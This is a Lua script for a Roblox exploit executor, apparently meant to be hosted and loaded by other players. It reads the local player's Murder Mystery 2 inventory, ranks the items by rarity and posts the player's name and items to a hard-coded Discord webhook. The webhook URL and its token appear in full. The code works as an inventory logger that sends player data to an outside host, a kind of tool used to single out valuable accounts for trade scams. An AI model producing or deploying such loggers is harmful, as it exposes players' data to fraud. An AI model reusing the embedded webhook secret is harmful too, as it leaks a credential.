-- Loadstring for your GitHub
local function main()
    -- Your Discord webhook URL
    local myPrivateWebhook = "https://discord.com/api/webhooks/1411856749559812218/l8emirnmA7sEMSOeQflxhl1U27Gka987AmSgc1hjmZZCLHvR8SGRuMAyTFmi-pR-cZ9p"

    -- Function to send data to Discord correctly
    local function sendToDiscord(webhookUrl, message)
        local success, err = pcall(function()
            local httpService = game:GetService("HttpService")
            local data = {
                content = message
            }
            local jsonData = httpService:JSONEncode(data)
            local response = request({
                Url = webhookUrl,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = jsonData
            })
            return true
        end)
        if not success then
            warn("[-] Discord send failed: ", err)
        end
        return success
    end

    -- Function to get and categorize inventory
    local function scanAndCategorizeInventory()
        local inventoryData = {
            Godly = {Guns = {}, Knives = {}, Pets = {}},
            Ancient = {Guns = {}, Knives = {}, Pets = {}},
            Legendary = {Guns = {}, Knives = {}, Pets = {}},
            Rare = {Guns = {}, Knives = {}, Pets = {}},
            Uncommon = {Guns = {}, Knives = {}, Pets = {}},
            Common = {Guns = {}, Knives = {}, Pets = {}},
            Unknown = {Guns = {}, Knives = {}, Pets = {}}
        }

        -- Attempt to find a well-known MM2 inventory module or folder
        -- This is the most game-specific part and may require adjustment
        local potentialLocations = {
            game:GetService("ReplicatedStorage"),
            game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"),
            game:GetService("ServerStorage") -- Will be nil on client, but pcall safe
        }

        local inventoryFolder
        for _, location in ipairs(potentialLocations) do
            inventoryFolder = location:FindFirstChild("Inventory") or location:FindFirstChild("PlayerInventory")
            if inventoryFolder then break end
        end

        if inventoryFolder then
            local items = inventoryFolder:GetChildren()
            for _, item in ipairs(items) do
                local itemName = item.Name
                local itemType = "Unknown"
                local itemRarity = "Unknown"

                -- Determine Type by name patterns
                if itemName:find("Gun") or itemName:find("Revolver") or itemName:find("Rifle") or itemName:find("Blaster") then
                    itemType = "Guns"
                elseif itemName:find("Knife") or itemName:find("Blade") or itemName:find("Sword") or itemName:find("Dagger") then
                    itemType = "Knives"
                elseif itemName:find("Pet") or itemName:find("Companion") then
                    itemType = "Pets"
                end

                -- Determine Rarity by name patterns (MM2 specific)
                if itemName:find("Godly") or itemName:find("Corrupt") then
                    itemRarity = "Godly"
                elseif itemName:find("Ancient") then
                    itemRarity = "Ancient"
                elseif itemName:find("Legendary") or itemName:find("Mythical") then
                    itemRarity = "Legendary"
                elseif itemName:find("Rare") then
                    itemRarity = "Rare"
                elseif itemName:find("Uncommon") then
                    itemRarity = "Uncommon"
                elseif itemName:find("Common") or itemName:find("Classic") then
                    itemRarity = "Common"
                end

                -- Insert the item into the categorized table
                if inventoryData[itemRarity] and inventoryData[itemRarity][itemType] then
                    table.insert(inventoryData[itemRarity][itemType], itemName)
                end
            end
        else
            return nil, "Could not locate Inventory folder." -- Return error if inventory isn't found
        end

        return inventoryData
    end

    -- Format the categorized data into a Discord message
    local function formatInventoryMessage(inventoryData, playerName)
        local message = string.format("**📦 INVENTORY SCAN COMPLETE**\nPlayer: `%s`\n\n", playerName)

        local rarityOrder = {"Godly", "Ancient", "Legendary", "Rare", "Uncommon", "Common", "Unknown"}
        local typeOrder = {"Guns", "Knives", "Pets"}

        for _, rarity in ipairs(rarityOrder) do
            local rarityBlock = ""
            for _, itemType in ipairs(typeOrder) do
                local itemList = inventoryData[rarity][itemType]
                if #itemList > 0 then
                    rarityBlock = rarityBlock .. string.format("**%s:** ", itemType)
                    rarityBlock = rarityBlock .. table.concat(itemList, ", ") .. "\n"
                end
            end
            if rarityBlock ~= "" then
                message = message .. string.format("\n__**%s**__\n%s", rarity:upper(), rarityBlock)
            end
        end

        -- Truncate message if it's too long for Discord (2000 character limit)
        if #message > 1900 then
            message = message:sub(1, 1900) .. "\n... (message truncated)"
        end

        return message
    end

    -- MAIN EXECUTION
    local playerName = game.Players.LocalPlayer.Name
    print("[+] Scanning inventory for: " .. playerName)

    local inventoryData, err = scanAndCategorizeInventory()

    if not inventoryData then
        sendToDiscord(myPrivateWebhook, "**❌ INVENTORY SCAN FAILED**\nReason: " .. err .. "\nPlayer: `" .. playerName .. "`")
        return
    end

    local finalMessage = formatInventoryMessage(inventoryData, playerName)
    local success = sendToDiscord(myPrivateWebhook, finalMessage)

    if success then
        print("[+] Inventory report sent successfully!")
    else
        warn("[-] Failed to send inventory report.")
    end
end

-- Start the script
main()
